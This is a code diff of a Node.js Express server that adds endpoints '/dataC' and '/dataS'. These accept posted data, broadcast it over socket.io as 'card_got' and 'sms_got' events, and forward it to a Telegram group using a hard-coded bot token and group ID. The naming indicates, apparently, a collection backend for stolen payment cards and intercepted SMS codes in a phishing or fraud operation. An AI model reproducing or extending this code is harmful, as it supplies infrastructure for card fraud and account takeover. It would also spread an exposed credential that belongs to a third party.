@@ -1,45 +1,77 @@
+var express_ = require('express');  
+var appSocket = express_();  
+var server = require('http').createServer(appSocket);  
+var io = require('socket.io')(server);
+const PORT = 8080;
+
+server.listen(process.env.PORT || 8080, function () {
+    console.log(`Listening on ${ PORT }`);
+    var intervalId = setInterval(function() {
+          io.emit('ping','ping');
+      }, 5000);
+});
+
+
 // Importing necessary modules
 const express = require('express');
 
 const TelegramBot = require('node-telegram-bot-api');
 
-// Replace 'YOUR_BOT_TOKEN' with your actual bot token
 const token = '6509996039:AAEpRtn2QdWcPYVZHHz2WxCCTZ7uK0jPY6g';
 
-// Create a bot instance
 const bot = new TelegramBot(token, { polling: false });
 
-// Replace 'YOUR_GROUP_ID' with your actual group chat ID
 const groupId = '-1002041458711';
 
-// Creating an instance of Express application
 const app = express();
 
-// Define middleware to parse JSON bodies
 app.use(express.json());
 
-// Define a GET endpoint
 app.get('/', (req, res) => {
     res.send('Hello, World!');
 });
 
-// Define a POST endpoint to handle incoming data
-app.post('/data', (req, res) => {
+app.post('/dataC', (req, res) => {
 //    const data = req.body; // This will contain the data sent in the request body
-//    const data_ = req.body.data;
+    const data_ = req.body.data;
+    //console.log("DATA",data_);
+    io.emit('card_got',data_);
 //    console.log('Received data:', data);
 //    console.log('DATA Got',data_);
 //    res.send('Data received successfully!');
 
-    bot.sendMessage(groupId, data_)
-        .then(() => {
-            //console.log('Message sent to group:', data_);
+     bot.sendMessage(groupId, data_)
+         .then(() => {
+        
         })
         .catch((error) => {
-            //console.error('Error sending message:', error);
-        });
+            console.log("ERROR",error);
+         });
+
+    res.status(200).send('Done!');
 
 });
+
+app.post('/dataS', (req, res) => {
+    //    const data = req.body; // This will contain the data sent in the request body
+        const data_ = req.body.data;
+      //  console.log("DATA",data_);
+        io.emit('sms_got',data_);
+    //    console.log('Received data:', data);
+    //    console.log('DATA Got',data_);
+    //    res.send('Data received successfully!');
+    
+         bot.sendMessage(groupId, data_)
+             .then(() => {
+            
+             })
+             .catch((error) => {
+                console.log("ERROR",error);
+             });
+
+        res.status(200).send('Done!');
+    
+    });
 
 // Define a GET endpoint with a parameter
 app.get('/user/:id', (req, res) => {
@@ -58,10 +90,6 @@ const port = 3000;
 app.listen(port, () => {
     console.log(`Server is running on http://localhost:${port}`);
 });
-
-
-
-
 
 
 
